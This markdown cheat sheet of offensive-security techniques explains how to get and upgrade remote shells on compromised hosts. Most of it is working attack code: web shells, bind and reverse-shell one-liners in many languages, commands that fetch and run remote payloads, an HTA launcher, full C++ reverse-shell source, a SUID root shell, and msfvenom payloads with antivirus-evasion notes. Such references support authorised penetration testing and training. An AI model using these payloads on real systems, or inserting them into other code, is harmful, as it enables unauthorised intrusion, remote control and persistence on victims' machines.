# General - Shells

The following note details the procedure and tools that can be used to leverage
a remote code execution into a fully `TTY` shell.

For Windows credentials (password or hashes) reuse and direct lateral
movements, refer to the `[Windows] Lateral movements` note.

### Miscellaneous

The [`rlwrap`](https://github.com/hanslub42/rlwrap) utility runs the specified
command and intercept further input to provide line editing and history
functionalities. It is useful for the reverse shell one-liners and tools that
do not natively implement those features (such as `netcat` for example) and
for which use of the arrows keyboard keys result in `^[[C` / `^[[D` / `^[[A` /
`^[[B`.

```bash
rlwrap <COMMAND> [<ARGUMENTS>]
```

### Detect firewall filtering

A firewall may be configured on the targeted system to block inbound or
outbound connection (`TCP`, `UDP`, `ICMP`). If `TCP` / `UDP` reverse shell
attempts are failing but `ICMP` packets are received from the target, a
firewall may be in deployed.

###### Outgoing traffic blocking

`tcpdump` can be used to listen to `ICMP` traffic received on host:

```bash
tcpdump -i <INTERFACE> icmp
```

On target, make ICMP `echo` requests using ping in **background** to prevent
shell lose in case of blocked ping:

```bash
ping -c 2 <IP> &

python -c 'import os;  os.popen("ping -c 2 <IP> &");"
python -c 'import os;  os.popen("ping -n 2 <IP> &");"

# Python in a pyjail
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('ping -c 2 <IP>').read()
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('ping -n 2 <IP>').read()
```

###### Windows firewall rules

The Windows firewall rules configured can be listed using the `netsh` `DOS`
utility and the `Get-NetFirewallRule` `PowerShell` cmdlet.

By default, three separate listings are present: `Domain profile` settings,
`private profile` settings and `public profile` settings. A different profile
can be applied to each network adapter. The `Domain profile` is applied if the
machine is joined to an Active Directory domain while the `private profile` is
applied if the network is identified by the user as a private network.
Otherwise and by default, the `public profile` is applied.

Windows blocks inbound connections and allows outbound connections for all
profiles by default.

```bash
# Show the profile applied to each network adapter
netsh advfirewall monitor show currentprofile

# Windows Firewall state for all profile (Public / Domain / Private)
netsh advfirewall show allprofiles
Get-NetFirewallProfile

# Show all rules for the given profile
netsh advfirewall firewall show rule profile=<public | private | domain | any | ...> name=all
Get-NetFirewallProfile -Name <Public | Private | Domain | * | ...> | Get-NetFirewallRule
```

### Web shells

A web shell is a script written in the supported language of the targeted web
server to be uploaded and executed by the web service. It provides a mean to
execute system commands on the target.

A collection of web shells for various languages
[is accessible on `GitHub`](https://github.com/xl7dev/WebShell).

`Kali Linux` also comes with a *smaller* collection of web shell, located in:

```bash
/usr/share/webshells
```

#### JSP

###### Basic

`JSP` one-liner without output to execute system commands through GET
parameters:

```bash
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

###### SecurityRiskAdvisors'

The `SecurityRiskAdvisors`' `cmd.jsp` web shell provides command execution and
file upload capability while being as small and widely compatible as possible.

Once uploaded on the target system, load the following `JavaScript` code
using the browser console to activate the user interface:

```bash
javascript:{window.localStorage.embed=window.atob("ZG9jdW1lbnQud3JpdGUoIjxwPiIpOw0KdmFyIGh0bWwgPSAiPGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSdjbWQuanNwJz5cDQo8aW5wdXQgbmFtZT0nYycgdHlwZT10ZXh0PjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz5cDQo8L2Zvcm0+PGhyPlwNCjxmb3JtIGFjdGlvbj0nY21kLmpzcCcgbWV0aG9kPXBvc3Q+XA0KVXBsb2FkIGRpcjogPGlucHV0IG5hbWU9J2EnIHR5cGU9dGV4dCB2YWx1ZT0nLic+PGJyPlwNClNlbGVjdCBhIGZpbGUgdG8gdXBsb2FkOiA8aW5wdXQgbmFtZT0nbicgdHlwZT0nZmlsZScgaWQ9J2YnPlwNCjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2InIGlkPSdiJz5cDQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz5cDQo8L2Zvcm0+PGhyPiI7DQp2YXIgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpkaXYuaW5uZXJIVE1MID0gaHRtbDsNCmRvY3VtZW50LmJvZHkuaW5zZXJ0QmVmb3JlKGRpdiwgZG9jdW1lbnQuYm9keS5maXJzdENoaWxkKTsNCg0KdmFyIGhhbmRsZUZpbGVTZWxlY3QgPSBmdW5jdGlvbihldnQpIHsNCiAgICB2YXIgZmlsZXMgPSBldnQudGFyZ2V0LmZpbGVzOw0KICAgIHZhciBmaWxlID0gZmlsZXNbMF07DQoNCiAgICBpZiAoZmlsZXMgJiYgZmlsZSkgew0KICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCg0KICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24ocmVhZGVyRXZ0KSB7DQogICAgICAgICAgICB2YXIgYmluYXJ5U3RyaW5nID0gcmVhZGVyRXZ0LnRhcmdldC5yZXN1bHQ7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYicpLnZhbHVlID0gYnRvYShiaW5hcnlTdHJpbmcpOw0KICAgICAgICB9Ow0KDQogICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcoZmlsZSk7DQogICAgfQ0KfTsNCmlmICh3aW5kb3cuRmlsZSAmJiB3aW5kb3cuRmlsZVJlYWRlciAmJiB3aW5kb3cuRmlsZUxpc3QgJiYgd2luZG93LkJsb2IpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGhhbmRsZUZpbGVTZWxlY3QsIGZhbHNlKTsNCn0gZWxzZSB7DQogICAgYWxlcnQoJ1RoZSBGaWxlIEFQSXMgYXJlIG5vdCBmdWxseSBzdXBwb3J0ZWQgaW4gdGhpcyBicm93c2VyLicpOw0KfQ==");eval(window.localStorage.embed);};void(0);
```

#### PHP

###### Basic

Basic PHP code to execute system commands through GET parameters:

```PHP
<?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
<?php if($_GET['cmd']) { exec($_GET['cmd'],$array); print_r($array); } ?>
<?php if($_GET['cmd']) { echo shell_exec($_GET['cmd']); } ?>
<?php if($_GET['cmd']) { echo passsthru($_GET['cmd']); } ?>
<?php if($_GET['cmd']) { preg_replace('/.*/e', $_GET['cmd'], ''); } ?>
```

###### Stealthy

Instead of passing the commands through the URL, which would appear in logs,
heades parameters can be used:

```php
$_SERVER['HTTP_ACCEPT_LANGUAGE']
$_SERVER['HTTP_USER_AGENT']
```

###### Obfuscation

The following functions can be used to obfuscate the code.

```php
eval()
assert()
base64()
gzdeflate()
str_rot13()
```

###### phpbash

phpbash is a simple standalone, semi-interactive web shell.
Upload the phpbash.php or phpbash.min.php file on the target and access it
with any Javascript-enabled web browser to achieve RCE.

https://github.com/Arrexel/phpbash

###### Weevely

Weevely is a password protected web shell designed for post-exploitation
purposes that can be extended over the network at runtime.

Upload weevely PHP agent to a target web server to get remote shell access to
it. It has more than 30 modules to assist administrative tasks, maintain access,
provide situational awareness, elevate privileges, and spread into the target
network.
The agent is a small, polymorphic PHP script hardly detected by AV and the
communication protocol is obfuscated within HTTP requests.

```bash
# Generate the backdoor agent
./weevely.py generate mypassword agent.php
Generated backdoor with password 'mypassword' in 'agent.php' of 671 byte size.

# Upload the generated agent under the target web folder.
# Make sure that the agent URL is reachable from your position and that it is correctly executed by the web server as PHP code.

# Connect to the agent
./weevely.py http://<TARGET>/agent.php mypassword
weevely>
```

#### CFM

Among others, the ColdFusion Markup Language `cfexec.cfm` web shell, located on
Kali by default at `/usr/share/webshells/cfm/cfexec.cfm`, can be used to execute
system commands on a web server supporting the CFM file format.

To execute `CMD` command on `Windows`, the parameters are as follow:

```bash
# Path to the cmd binary
Command: c:\windows\system32\cmd.exe

# Command to execute
Options: /c <COMMAND>
```

### Bind Shells

###### [Linux / Windows] Netcat

```bash
# Linux
# If nc's "-e" option is available on the targeted system:
nc [-4] -lvnp <PORT> -e /bin/sh &
nc [-4] -lvnp <PORT> -e /bin/sh &

# Windows
# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe or https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip offer a better compatibility across Windows systems
nc.exe -lvnp <PORT> -e cmd.exe
nc64.exe -lvnp <PORT> -e cmd.exe
```

### Reverse Shells

#### Listener on host

###### [Linux / Windows] Basic listeners

```bash
# TCP
nc -lvnp <PORT>
rlwrap nc -lvnp <PORT>

# UDP
nc -lvnpu <PORT>
rlwrap nc -lvnpu <PORT>

# With SSL / TLS support
ncat --ssl -vv -l -p <PORT>

openssl req -x509 -newkey rsa:4096 -keyout tmpkey.pem -out tmpcert.pem -days 365 -nodes
openssl s_server -quiet -key tmpkey.pem -cert tmpcert.pem -port <PORT>
```

###### [Windows] PowerCat

```bash
powercat -l -p 443 -ep
powercat -l -p 443 -e <BINARY>
```

###### [Linux / Windows] xct's xc

```bash
xc -l -p <PORT>
rlwrap xc -l -p <PORT>

xc.exe -l -p <PORT>
```

###### [Linux / Windows] Python ICMP

```bash
python icmpsh_m.py <HOST_IP> <TARGET_IP>
```

#### One-liners reverse shell

###### [Linux] sh / bash

```bash
# TCP (requires a TCP listener).
# In order to use the "/dev/tcp" device file, the current shell must be bash (and not sh or dash).
# Use bash -c "<REVERSE_ONELINER>" if the current shell is sh or dash.
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done
exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196

# UDP (requires an UDP listener).
sh -i >& /dev/udp/<IP>/<PORT> 0>&1
```

###### [Linux / Windows] Netcat

```bash
# Linux
# If nc's "-e" option is available on the targeted system:
nc -e /bin/sh <IP> <PORT> &

# Otherwise:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f

# Windows
# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe or https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip offer a better compatibility across Windows systems
nc.exe -e cmd.exe <IP> <PORT>
nc64.exe -e cmd.exe <IP> <PORT>
```

###### [Linux] Socat

`socat` is a command line utility that establishes two bidirectional byte
streams and transfers data between them, often considered as a more advanced
version of `netcat`. It can for example have multiple clients listening on a
same port or reuse a connection. It is rarely present by default in Linux
distributions.

```bash
socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
socat tcp-connect:<IP>:<PORT> exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane
socat tcp-connect:<IP>:<PORT> exec:"sh -li",pty,stderr,setsid,sigint,sane
socat tcp-connect:<IP>:<PORT> exec:"/bin/sh -li",pty,stderr,setsid,sigint,sane
```

###### [Windows] PowerShell

*Standalone one-liner*

Starting PowerShell with the straight reverse shell command,
`powershell -c <COMMAND>`, may results in error. Encoding and executing the
command in `base64` oftentimes proves to be more successful.

```bash
# Conversion to base64 in PowerShell.
# Can be executed on attacking system, to  encode in base64 the reverse shell script.
$cmd = '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$EncodedCmd =[Convert]::ToBase64String($Bytes)
$EncodedCmd

# Conversion to base64 in bash.
echo "<COMMAND>" | iconv --to-code UTF-16LE | base64 -w 0

powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD>
```

*PowerCat*

`powercat` is a PowerShell function, for PowerShell Version 2 and later,
providing the same functionalities as `netcat`.

`powercat` can be used to transfer data and execute commands over TCP, UDP and
DNS. It can be used to execute a local executable, such as `cmd`, `powershell`
directly, or a custom payload.

```bash
As with any PowerShell function, powercat has to be loaded in memory to be executed
. .\powercat.ps1
IEX (New-Object System.Net.Webclient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/powercat.ps1')

# -ep: execute PowerShell
# -e: or execute the specified binary
powercat -c <IP> -p <PORT> -ep
powercat -c <IP> -p <PORT> -e <BINARY>

# Over UDP
powercat -u -c <IP> -p <PORT> -ep

# Over DNS
powercat -c <DNS_SERVER_IP> -p <DNS_SERVER_PORT> -dns <DNS_HOSTNAME> -ep
```

###### Python

```python
# Linux
python -c 'import os;  os.popen("nc -e /bin/sh <IP> <PORT> &");'
python -c 'import os;  os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f &");'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# From a PyJail
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('<REVERSE_SHELL>').read()
```

###### PHP

```bash
# Linux
# This code assumes that the TCP connection uses file descriptor 3.
# If it doesn’t work, try 4, 5, 6…
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

###### Perl

```perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

###### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

###### OpenSSL

Requires a listener that supports `SSL` / `TLS` connections.

```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s
```

###### Groovy

```bash
# Source: https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
# BINARY: /bin/sh | /usr/bin/bash | cmd.exe | powershell.exe | ...
String host="<IP | HOSTNAME>";
int port=<PORT>;
String cmd="<BINARY>";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### Complete reverse shell scripts

The scripts usually need to be uploaded on the target or hosted on a webserver,
which can be done (for example) using python:

```python
# Python 3.X
python -m http.server <PORT>

# Python 2.X.
python -m SimpleHTTPServer <PORT>
```

###### PowerShell

The [`Nishang PowerShell`](https://github.com/samratashok/nishang) scripts can
be used to get a reverse shell.

The following commands will load directly in memory the PowerShell script hosted
on the remote webserver:

```powershell
# TCP
powershell -nop -Win Hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"

# ICMP - Needs a ICMP listener
powershell -nop -Win Hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>"
```

The PowerShell script can also be started directly upon download if the invoke
command is added at the end of the script
`Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>`

###### PHP

The pentestmonkey php-reverse-shell PHP script is a proper interactive reverse
shell meant to be uploaded on a web service that runs PHP.

The following two lines need to be updated in the script:

```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

The script can also be loaded directly in memory from a remote webserver, which
can be used to leverage a remote command execution into a reverse shell on a
server with PHP available:

```php
curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php
wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php

# Through PHP code injection
# The system call be replaced with various PHP functionalities detailed above.
system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
```

###### [Windows] HTML Application

Windows `HTML Application (HTA)` file are `HTML` based and may contain
`JavaScript` or `VBScript` that will be interpreted by the Windows operating
system. More precisely, the `HTA` script can be interpreted through
`Internet Explorer` or the Windows engine `mshta.exe`. As the file is not
written on disk but directly interpreted from the remote URL, this technique
can be used to bypass some anti-virus solutions (statement that does not hold
as true now).

The following `HTA` script can be used to execute some PowerShell code (such
as loading in memory and executing a PowerShell script). As the 32-bit version
of `mshta.exe` seems to be executed by default, be aware that it will by
default execute the 32-bit version of PowerShell. Even if the
`C:\Windows\System32` path is specified, it will be mapped to
`C:\Windows\SysWOW64` (for compatibility reasons). To force the 64-bit version
of PowerShell to executed (needed for 64-bit shellcode for instance), the
`C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe` path should be
specified.

```
# <COMMAND> example: powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>

<script language="VBScript">
  window.moveTo -4000, -4000
  Set eWZ3pL4 = CreateObject("Wscript.Shell")
  Set gOhlGr = CreateObject("Scripting.FileSystemObject")
  For each path in Split(eWZ3pL4.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If gOhlGr.FileExists(path + "\..\powershell.exe") Then
      eWZ3pL4.Run "<COMMAND>",0
      Exit For
    End If
  Next
  window.close()
</script>
```

The [Nishang's
`Out-HTA`](https://github.com/samratashok/nishang/blob/master/Client/Out-HTA.ps1)
PowerShell cmdlet can be used as well to generate a HTA file with in-lined
commands or that will download and execute a remote PowerShell script. It has
the notable advantage of providing a failover mechanism: a live page related to
Windows Defender from the Microsoft website is loaded if the HTA execution
fails.

```bash
# Import-Module .\Out-HTA.ps1
# Get-Help -full Out-HTA

Out-HTA -Payload '<COMMAND>'
Out-HTA -PayloadURL '<http://<WEBSERVER_IP>:<WEBSERVER_PORT>/<PowerShell.ps1>'
Out-HTA -PayloadScript '<POWERSHELL_FILEPATH>'
```

#### Complete reverse shell binaries

###### [Linux] C binary for SUID shell

The following code can be compiled to get a binary that will spawn a shell with
out dropping the SID bit. Change the owner of the binary if needed
`chown root.root suid` and then set the SUID bit and execution mode of the
compiled binary using `chmod 4755 suid` or `chmod a=srx suid`.

```c
# gcc -m32 -Wl,--hash-style=both -o suid suid.c

int main(void) {
    setgid(0);
		setuid(0);
    execl("/bin/sh", "sh", 0);
}
```

###### Compiled reverse one-liner

If reverse shell must be made through a binary the following c code can be used:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	system("<SHELLCODE_ONELINER>");
	return 0;
}
```

The binary must be compiled on the same architecture as the target (advised to
use the same OS and kernel for Linux targets).

To compile for a Windows target on Linux use the cross-compiler `mingw`:

```bash
# 32 bits
i686-w64-mingw32-gcc -o test.exe test.c

# 64 bits
x86_64-w64-mingw32-gcc -o test.exe test.c
```

###### [Linux / Windows] xct's xc

`xc` is a reverse shell for Linux and Windows written in `Go`. It includes a
number of basic functionalities: file upload / download, local / remote ports
forwarding, run as another user, client auto reconnect, etc. It can also be
used on Windows systems to load and execute `.NET` assembly from memory.

```bash
# A xct's xc listener must be listening.
xc.exe <HOSTNAME | IP> <PORT>
xc <HOSTNAME | IP> <PORT>
```

Once a session has been established through `xc`, the following notable
commands are supported:

```bash
# Linux / Windows common commands.
!upload <SOURCE_FILE> <DESTINATION_FILE> - uploads the specified file to the remote host.
!download <SOURCE_FILE> <DESTINATION_FILE> - download the specified file from the remote host.

!lsfwd - lists the current ports forwarding.
!rmfwd <INDEX> - removes the specified port forward.
!lfwd <LOCAL_PORT> <REMOTE_IP> <REMOTE_PORT> - adds a local port forward (to forward traffic received on the local IP:<LOCAL_PORT> to <REMOTE_IP>:<REMOTE_PORT>).
!rfwd <REMOTE_PORT> <LOCAL_IP> <LOCAL_PORT> - adds a remote port (to make accessible <LOCAL_IP>:<LOCAL_PORT> on the remote host at <REMOTE_PORT>).

!shell - opens an interactive CMD prompt (cmd.exe) or shell (/bin/sh), that can be exited at will.
!runas <USERNAME> <PASSWORD> <WORKGROUP | DOMAIN> - restart the session as the specified user.
!spawn <REMOTE_PORT> - spawns another reverse shell session client on the specified port.
!met <REMOTE_PORT> - spawns a meterpreter on the specified port (requires a x64/meterpreter/reverse_tcp listener).

# Windows specific commands
!powershell - starts PowerShell in the session.
!runasps <USERNAME> <PASSWORD> <WORKGROUP | DOMAIN> - restart / start a PowerShell session as the specified user (similarly to runas but spawn a PowerShell session).
!vulns - checks for common vulnerabilities using Invoke-PrivescCheck -Extended.
!net <NET_BINARY> <ARG1> <ARG2> ... <ARGN> - uploads and runs a .NET binary from memory using the specified arguments (if any).

# Linux specific commands.
!ssh <LOCAL_PORT> - starts the sshddeamon with the configured keys on the specified local port.
```

###### msfvenom reverse shell binary

`msfvenom` can be used to generate a reverse shell binary:

```bash
# 32 bits
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>

# 64 bits
msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
```

For more information on how to generate and use reverse shell binaries using
the `Metasploit` framework, refer to the `Meterpreter` section below.

###### C / CPP simple reverse shell

As an alternative to `msfvenom`, the following CPP code, from the
[C-Reverse-Shell](https://github.com/dev-frog/C-Reverse-Shell) GitHub
repository, can be used to compile a simple reverse shell.

The `char host[] = "<IP>";` and `int port = <PORT>;` instructions should be
updated to match the contacted server. The reverse shell binary can be simply
executed with out arguments or using `re.exe <IP> <PORT>`.

```bash
# Compilation to a static standalone binary from a Linux operating system.
i686-w64-mingw32-g++ re.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

```cpp
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void RunShell(char* C2Server, int C2Port) {
    while(true) {
        Sleep(5000);    // Five Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "<IP>";  // change this to your ip address
        int port = <PORT>;                //chnage this to your open port
        RunShell(host, port);
    }
    return 0;
}
```

###### chashell

Chashell is a cross-platform Go reverse shell that communicates over DNS. It
can be used to bypass firewalls or tightly restricted networks. As `chashell`
relies on DNS, a Domain Name is required and must be bought and configured.

`chashell` makes use of a (multi-client) control server, `chaserv`, to receive
the reverse shell connections.

The following commands can be used to build the client and server and to
configure the DNS record:

```
# Building
export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
export DOMAIN_NAME=<FQDN>
make build-all

# DNS record configuration
<PREFIX> 300 IN A <SERVE_IP>
c 300 IN NS <PREFIX>.<DOMAIN_NAME>.
```

The `chaserv` binary must be run on the control server and the `chashell`
binary on the compromised host.

### (Optional) TTY

 A TTY is a particular kind of device file which implements a number of
additional commands beyond read and write.

A TTY shell may be needed for an exploit to work and is required to make use of
`sudo`. It is recommended to upgrade any shell obtained to TTY before
attempting privileges escalation techniques.

```bash
/bin/sh -i
/bin/bash -i
echo os.system('/bin/bash')

# Python
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

# Perl
perl -e 'exec "/bin/sh";'

# From within IRB
exec "/bin/sh"

# From within vi
:!bash
:set shell=/bin/bash:shell

# With nmap
!sh
```

### (Optional) Auto-completion and commands history

  - Background the reverse shell terminal using `Ctrl+Z`
  - Set host terminal to raw with echo unset: `stty raw -echo`
  - Foreground the reverse shell terminal `fg` and re-initialize it using
    `reset`

If the TERM environment variable is not set on the reverse shell:

```
ctrl+z
echo $TERM
fg
export TERM=<TERM>
```

Lastly, the shell might not be of the correct height or width. To update the
shell height / width to correspond to the terminal size use:

```
ctrl+z
stty size
-> <ROWS> <COLUMNS>
fg
stty -rows <ROWS> -columns <COLUMNS>
```

### Meterpreter

Meterpreter is an advanced, dynamically extensible payload that uses in-memory
DLL injection stagers and is extended over the network at runtime.
It communicates over the stager socket and provides a comprehensive
client-side Ruby API.
It features command history, tab completion, channels, and more.

###### Handler

When using a meterpreter payload, a handler must be started on the host machine.

The commands to start a metasploit handler are as follows:

```
# msfconsole -q

msf> use multi/handler

# Set the payload being executed on the target
msf> set payload <PAYLOAD>

# Set the local IP and port. In case of a NATED VM with port
# forwarding/redirection, the IP 0.0.0.0 can be used
msf> set LHOST <HOSTIP>
msf> set LPORT <HOSTPORT>

# To be able to keep several sessions at a time on a single multi/handler
msf> set ExitOnSession false
msf> exploit -j -z
```

###### MsfVenom & MSFPC

The metasploit framework msfvenom is a powerful standalone payload generator.

Two kinds of payloads can be generated:
  - Staged payloads that will require a metasploit handler
  - Stageless payloads that will not require a metasploit handler (and will
	  work with netcat for example)

Note that, while offering encoding techniques, the binary payloads generated
with msfvenom are often detected by AV softwares. To generate stealthier binary
payloads use Shellter [(Windows / binary) Shellter].

The MSFvenom Payload Creator (MSFPC) bash script can be used to easily generate
various "basic" Meterpreter payloads via msfvenom:

```
<TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .exe // .dll]

